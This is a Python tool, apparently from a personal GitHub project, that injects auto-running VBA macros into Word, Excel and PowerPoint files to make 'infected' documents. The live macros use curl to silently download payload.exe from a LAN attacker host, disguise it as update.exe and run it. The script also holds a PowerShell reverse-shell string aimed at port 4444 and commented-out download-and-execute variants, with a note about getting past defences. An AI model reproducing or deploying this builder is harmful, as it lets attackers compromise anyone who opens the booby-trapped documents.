import os
import base64
import win32com.client as win32

# ضع الـ IP الخاص بجهاز Parrot OS هنا
target_ip = '192.168.178.134'
target_port = '4444'

# بناء أمر الباورشل الأصلي
raw_ps = (
    f"$client = New-Object System.Net.Sockets.TCPClient('{target_ip}',"
    f" {target_port});$stream = $client.GetStream();[byte[]]$bytes ="
    " 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length))"
    " -ne 0){;$data = (New-Object -TypeName"
    " System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex"
    " $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path +"
    " '> ';$sendbyte ="
    " ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
)

# تشفير الأمر إلى Base64 بنسق UTF-16LE لتجاوز الحماية
#encoded_command = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')

# قالب الـ VBA الآمن والمشفر
# vba_remote_code = f"""
# Sub AutoOpen()
#     On Error Resume Next
#     Dim cmd As String
#     cmd = "powershell -WindowStyle Hidden -NoProfile  {raw_ps}"
#     CreateObject("WScript.Shell").Run cmd, 0
# End Sub
# """

# target_ip = '192.168.178.130'  # ايبี جهاز Parrot الخاص بك

# vba_remote_code = f"""
# Sub AutoOpen()
#     On Error Resume Next
#     Dim url As String
#     Dim savePath As String
#     url = "http://{target_ip}/download/payload.exe"
#     savePath = Environ("Desktop") & "\\update.exe"
    
#     Dim xHttp As Object, bStrm As Object
#     Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
#     xHttp.Open "GET", url, False
#     xHttp.Send
    
#     If xHttp.Status = 200 Then
#         Set bStrm = CreateObject("ADODB.Stream")
#         bStrm.Type = 1
#         bStrm.Open
#         bStrm.Write xHttp.responseBody
#         bStrm.SaveToFile savePath, 2
#         bStrm.Close
        
#         CreateObject("WScript.Shell").Run savePath, 0
#     End If
# End Sub
# """

vba_remote_code = """
                Sub AutoOpen()
                    On Error Resume Next
                    CreateObject("WScript.Shell").Run "curl http://192.168.178.130:80/download/payload.exe -o C:/Users/hadil/Desktop/update.exe && C:/Users/hadil/Desktop/update.exe ", 0, True
                    CreateObject("WScript.Shell").Run "C:/Users/hadil/Desktop/update.exe ", 0
                End Sub
                """

excel_vba_code = """
                Sub Workbook_Open()
                    On Error Resume Next
                    CreateObject("WScript.Shell").Run "curl http://192.168.178.130:80/download/payload.exe -o C:/Users/hadil/Desktop/update.exe && C:/Users/hadil/Desktop/update.exe ", 0, True
                    CreateObject("WScript.Shell").Run "C:/Users/hadil/Desktop/update.exe ", 0
                End Sub
                """    

def process_office_payload():
  print('=== Advanced Multi-Format Office Payload Generator ===')
  source_path = (
      input(
          'Enter path of your source file (or press Enter to generate a fresh'
          ' blank file): '
      )
      .strip()
      .strip('"')
  )

  word = None
  excel = None
  ppt = None

  try:
    # Case 1: User provided an existing file to infect
    if source_path and os.path.exists(source_path):
      ext = os.path.splitext(source_path)[1].lower()
      abs_path = os.path.abspath(source_path)
      print(f'[*] Processing existing file: {source_path}')

      if ext in ['.docx', '.docm']:
        word = win32.Dispatch('Word.Application')
        word.Visible = False
        word.DisplayAlerts = 0

        doc = word.Documents.Open(abs_path)
        vba_code = vba_remote_code
        vb_comp = doc.VBProject.VBComponents.Add(1)
        vb_comp.CodeModule.AddFromString(vba_code)

        output_path = os.path.join(
            os.path.dirname(abs_path), 'infected_output.docm'
        )
        doc.SaveAs2(output_path, FileFormat=13)  # .docm
        doc.Close(True)
        print(f'\n[✔] Success! Infected Word document saved as: {output_path}')

      elif ext in ['.xlsx', '.xlsm']:
        excel = win32.Dispatch('Excel.Application')
        excel.Visible = False
        excel.DisplayAlerts = False

        wb = excel.Workbooks.Open(abs_path)
        # Excel requires Workbook_Open to be inside ThisWorkbook module
        vba_code = excel_vba_code
        for comp in wb.VBProject.VBComponents:
          if comp.Name == 'ThisWorkbook':
            comp.CodeModule.AddFromString(vba_code)
            break

        output_path = os.path.join(
            os.path.dirname(abs_path), 'infected_output.xlsm'
        )
        wb.SaveAs(output_path, FileFormat=52)  # .xlsm
        wb.Close(True)
        print(f'\n[✔] Success! Infected Excel workbook saved as: {output_path}')

      elif ext in ['.pptx', '.pptm']:
        ppt = win32.Dispatch('PowerPoint.Application')
        prs = ppt.Presentations.Open(abs_path, WithWindow=False)
        vba_code = vba_remote_code
        vb_comp = prs.VBProject.VBComponents.Add(1)
        vb_comp.CodeModule.AddFromString(vba_code)

        output_path = os.path.join(
            os.path.dirname(abs_path), 'infected_output.pptm'
        )
        prs.SaveAs(output_path, 24)  # 24 = ppSaveAsPresentationMacroEnabled (.pptm)
        prs.Close()
        print(
            '\n[✔] Success! Infected PowerPoint presentation saved as:'
            f' {output_path}'
        )
      else:
        print('[-] Unsupported file format.')

    # Case 2: No file provided -> Generate a clean pre-infected blank file
    else:
      print(
          '[*] No source file provided. Generating a clean pre-infected file...'
      )
      file_type = (
          input(
              'Choose file type -> [1] Word (.docm) | [2] Excel (.xlsm) | [3]'
              ' PowerPoint (.pptm): '
          )
          .strip()
      )

      if file_type == '2':
        excel = win32.Dispatch('Excel.Application')
        excel.Visible = False
        excel.DisplayAlerts = False

        wb = excel.Workbooks.Add()
        # vba_code = """
        #         Private Sub Workbook_Open()
        #             On Error Resume Next
        #             CreateObject("WScript.Shell").Run "calc.exe", 0
        #         End Sub
        #         """

        vba_code = excel_vba_code
        for comp in wb.VBProject.VBComponents:
          if comp.Name == 'ThisWorkbook':
            comp.CodeModule.AddFromString(vba_code)
            break

        output_path = os.path.abspath('clean_infected_sheet.xlsm')
        wb.SaveAs(output_path, FileFormat=52)
        wb.Close(True)
        print(f'\n[✔] Success! Blank infected Excel saved as: {output_path}')

      elif file_type == '3':
        ppt = win32.Dispatch('PowerPoint.Application')
        prs = ppt.Presentations.Add()
        # vba_code = """
        #         Sub Auto_Open()
        #             On Error Resume Next
        #             CreateObject("WScript.Shell").Run "curl http://192.168.178.130:80/download/payload.exe -o ./Desktop/update.exe", 0
        #         End Sub
        #         """
        vba_code = vba_remote_code

        vb_comp = prs.VBProject.VBComponents.Add(1)
        vb_comp.CodeModule.AddFromString(vba_code)

        output_path = os.path.abspath('clean_infected_pres.pptm')
        prs.SaveAs(output_path, 24)
        prs.Close()
        print(
            f'\n[✔] Success! Blank infected PowerPoint saved as: {output_path}'
        )

      else:
        word = win32.Dispatch('Word.Application')
        word.Visible = False
        word.DisplayAlerts = 0

        doc = word.Documents.Add()
        # vba_code = """
        #         Sub AutoOpen()
        #             On Error Resume Next
        #             CreateObject("WScript.Shell").Run "curl http://192.168.178.130:80/download/payload.exe -o C:/Users/hadil/Desktop/update.exe && C:/Users/hadil/Desktop/update.exe ", 0, True
        #             CreateObject("WScript.Shell").Run "C:/Users/hadil/Desktop/update.exe ", 0
        #         End Sub
        #         """
        vba_code =vba_remote_code
        vb_comp = doc.VBProject.VBComponents.Add(1)
        vb_comp.CodeModule.AddFromString(vba_code)

        output_path = os.path.abspath('clean_infected_doc.docm')
        doc.SaveAs2(output_path, FileFormat=13)
        doc.Close(True)
        print(f'\n[✔] Success! Blank infected Word document saved as: {output_path}')

  except Exception as e:
    print(f'[-] An unexpected error occurred: {e}')

  finally:
    for app in [word, excel, ppt]:
      if app:
        try:
          app.Quit()
        except:
          pass


if __name__ == '__main__':
  print('developed by: [ein.Mohammed Hani ]/ [https://github.com/Mohd-hani3211]')
  print('=== Advanced Multi-Format Office Payload Generator ===')
  print('This tool allows you to inject a remote code payload into Word, Excel, or PowerPoint files.')
  print()
  process_office_payload()